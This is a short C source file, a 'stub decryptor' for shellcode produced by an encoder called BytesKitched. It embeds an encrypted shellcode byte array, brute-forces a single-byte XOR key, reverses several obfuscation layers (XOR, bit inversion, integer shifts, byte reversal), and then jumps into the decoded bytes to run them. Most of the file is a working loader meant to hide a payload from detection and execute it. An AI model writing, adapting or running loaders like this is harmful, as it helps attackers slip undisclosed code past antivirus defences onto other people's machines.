/*
Stub Decryptor for BytesKitched shellcode output
Written by Hussien Yousef
*/

#include <stdio.h>
// enter your encrypted shellcode here
unsigned char shellcode[] = \
"\xca\xd6\xc0\x0b\x1f\x43\x02\x04\x0e\x43\x93\x92\x93\x9c\x84\x13\xa1\xbe\x5d\xa4\x5d\x67\xdc\xd3\x5d\x37\x67\x86\x9b\x15\x25\x13\xa1\x53\xdc\xd3\x5d\x6e\xdd\xa4\x5d\xbf\xe5\x13\xa1\x8d\xe5\x3d\x3d\x7c\x06\x8c\xe5\x6e\x06\x09\x6f\xdf\x0b\x7c\x04\x0a\x6f\x87\xef\x13\x91\x4f\x28\xaa\x92\x4f\x30\xe4\x93\x4f\x30\xe4\x6d\x05\xb7\x5d\xfe\x09\xde\xbe\x5d\x13\xa1\x8d\xe5\x6d\x06\x6d\x06\x6c\xdf\xb7\x5d\x09\xdc\x3c\xac\x5d";

int main(){
	// Shellcode size
	int shellcode_size = sizeof(shellcode)-1;

	// Brutforce the XOR key
	unsigned char key = '\x01';
	int found = 0;
	unsigned char temp;
	while(key != 0xff){
		temp = shellcode[0] ^ key;
		if(temp == 'Y'){
			temp = shellcode[1] ^ key;
			if(temp == 'E'){
				temp = shellcode[2] ^ key;
				if(temp == 'S'){
					found = 1;
					break;
				}
			}
		}
		key = key + 0x01;
	}
	if(!found){
		printf("Sh3llc0d3 is not encrypt3d correctly");
		return 0;
	}


	// Decrypt the shellcode with the found key
	for(int i =0; i < shellcode_size-3; i++){
		shellcode[i+3] = shellcode[i+3] ^ key;
	}
	
	// Reverse all of the shellcode bits (xor with 1)
	for(int i = 0; i < shellcode_size-3; i++){
		shellcode[i+3] = shellcode[i+3] ^ 0xff;
	}

	// integer + 1
	int *shell_ptr = (int *) &shellcode[3];
        int rotations = (shellcode_size-3)/4;
        for(int itr = 0; itr < rotations; itr++){
                *shell_ptr = *shell_ptr + 1;
                shell_ptr++; // will increase 4 bytes
        }

	// reverse the string
        unsigned char *start_ptr = (unsigned char *) &shellcode[3];
        unsigned char *end_ptr = start_ptr +  (shellcode_size-4);
        while(start_ptr != end_ptr && start_ptr < end_ptr){
                temp = *start_ptr;
                *start_ptr = *end_ptr;
                *end_ptr = temp;
                start_ptr++;
                end_ptr--;
        }

	// jmp to shellcode
	int (*ret)() = (int(*)())&shellcode[3];
	ret();
	
	return 0;
}
